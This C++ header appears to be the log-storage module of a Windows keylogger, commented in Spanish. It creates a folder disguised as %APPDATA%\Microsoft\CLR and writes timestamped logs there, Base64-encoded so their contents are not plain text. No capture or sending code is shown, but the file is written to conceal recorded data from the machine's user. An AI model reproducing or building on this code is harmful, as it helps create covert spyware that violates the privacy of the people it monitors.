#ifndef IO_H
#define IO_H

#include <windows.h>
#include <string>
#include <cstdlib>
#include <fstream>
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath (const bool append_separator = false)
    {
        std::string appdata_dir(getenv("APPDATA")); //busca el directorio de la carpeta appdata usada por el enviroment.
        std::string full = appdata_dir + "\\Microsoft\\CLR"; // agrega el archvo a la carpeta de microsot clr

        return full + (append_separator ? "\\" : ""); //formatting
    }
    bool MKOneDr(std::string path)  //en caso de que sea necesario.
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path) //relleno para arreglar un par de errores situacionales.
    {
        for(char &c : path)
            if(c=='\\')
            {
                c='\0';
                if(!MKOneDr(path))
                    return false;
                c = '\\';
            }
        return true;
    }

    template<class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }

        catch(...)
        {
            return "";
        }
    }

}

#endif // IO_H creo q va esto
